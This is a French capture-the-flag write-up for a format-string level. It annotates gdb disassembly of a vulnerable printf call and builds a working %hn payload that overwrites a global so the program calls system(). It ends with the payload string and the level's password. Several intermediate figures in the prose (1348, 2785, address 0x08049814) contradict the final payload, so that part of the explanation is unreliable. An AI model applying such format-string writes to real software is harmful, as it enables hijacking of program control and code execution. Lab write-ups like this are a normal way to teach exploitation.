```
Dump of assembler code for function n:
   0x08048457 <+0>:	push   ebp
   0x08048458 <+1>:	mov    ebp,esp
   0x0804845a <+3>:	sub    esp,0x218						; 536
   0x08048460 <+9>:	mov    eax,ds:0x8049804					; address STDIN
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax		; esp+8 = STDIN
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200	; esp+4 = 512
   0x08048471 <+26>:	lea    eax,[ebp-0x208]				; *s = ebp-220
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>		; fgets(*s)
   0x0804847f <+40>:	lea    eax,[ebp-0x208]
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax
   0x08048488 <+49>:	call   0x8048444 <p>				; p(*s)
   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544				; adresse à écrire dans 0x8049810
   0x08048497 <+64>:	jne    0x80484a5 <n+78>				; leave -> ret
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
End of assembler dump.
```
```
Dump of assembler code for function p:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]		; *s
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax
   0x08048450 <+12>:	call   0x8048340 <printf@plt>	; printf(*s)
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret    
End of assembler dump.
```

Au même titre que l'exercice précédent, on est sur du format string. Sauf qu'ici, l'objectif est d'écrire une adresse dans une adresse.
Le souci est que nous devons écrire `0x01025544` dans l'adresse `0x8049810`, ce qui correspondrait à écrire `16930116` octets au total, soit une chaine bien trop longue à écrire.

Pour ce faire, nous pouvons utiliser le modificateur `h` sur le format `%n` afin d'écrire un short au lieu d'un int. Par conséquent, on peut couper notre `int` en deux :
`0x0102` et `0x5544`.

Ce qui nous donne indépendamment `258` octets et `21828` octets à écrire. On a donc à écrire deux adresses dans la stack, la première celle qui pointera vers `0x5544`, et la seconde celle vers `0x0102`.

Attention tout de même à penser au fait que lorsque l'on aura écrit nos `21828` octets, il faudra les soustraires aux `258` d'après pour écrire exactement `21828` et non `22086`.

```
(gdb) x/100xw $sp
0xbffff4f0:	0xbffff728	0xb7ff26b0	0xbffff764	0xb7fd0ff4
0xbffff500:	0x00000000	0x00000000	0xbffff728	0x0804848d
0xbffff510:	0xbffff520	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff520:	0x41414141	0x41414141	0x41414141	0x41414141
```

On se rend compte ici également qu'on va ou devoir utiliser beaucoup de `%x` pour destacker les valeurs, ou utiliser le modificateur `$` afin de sélectionner la bonne adresse sur la stack.

Par exemple :
`%1$x` va afficher le premier argument sur la stack en hexadecimal, soit le même qu'avec uniquement `%x` (`0xb7ff26b0`).
Donc, notre injection commence au 12e argument. Du fait, si on souhaite obtenir `0x41414141`, il nous suffit de faire :
`AAAA%11$x`.
`AAAA` ira écrire le 12e argument sur la stack, et `%11$x` ira le lire.

On doit donc écrire à l'adresse `0x08049810`, et d'abord écrire `1348`, il nous faut donc avancer de 4, donc écrire sur :
- `0x08049814`, puis :
- `0x08049810`

Résultat :
- `\x12\x98\x04\x08\x10\x98\x04\x08` écrira les deux adresses les unes à la suite des autres sur la stack.
- `%250x` écrira l'adresse 1 avec un padding formant un tout de 250 octets (+ les 8 composant l'adresse).
- `%12$hn` écrira un short sur l'adresse 12.
- `%21570x` écrira l'adresse 2 avec un padding formant un tout de 2785 octets (+ 1348 précédemment écrits).
- `%13$hn` écrira un short sur l'adresse 13.

`\x12\x98\x04\x08\x10\x98\x04\x08%250x%12$hn%21570x%13$hn`

Password: `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`